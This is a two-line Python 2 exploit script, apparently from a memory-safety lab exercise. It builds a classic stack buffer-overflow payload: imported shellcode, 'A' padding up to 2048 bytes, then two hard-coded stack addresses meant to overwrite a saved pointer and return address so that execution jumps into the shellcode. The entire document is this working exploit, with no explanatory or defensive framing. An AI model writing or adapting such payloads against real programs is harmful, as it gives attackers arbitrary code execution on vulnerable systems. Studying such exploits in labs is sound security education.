from shellcode import shellcode
print shellcode+"A"*(2048-len(shellcode))+"\x58\xb7\xfe\xbf"+"\x6c\xbf\xfe\xbf"
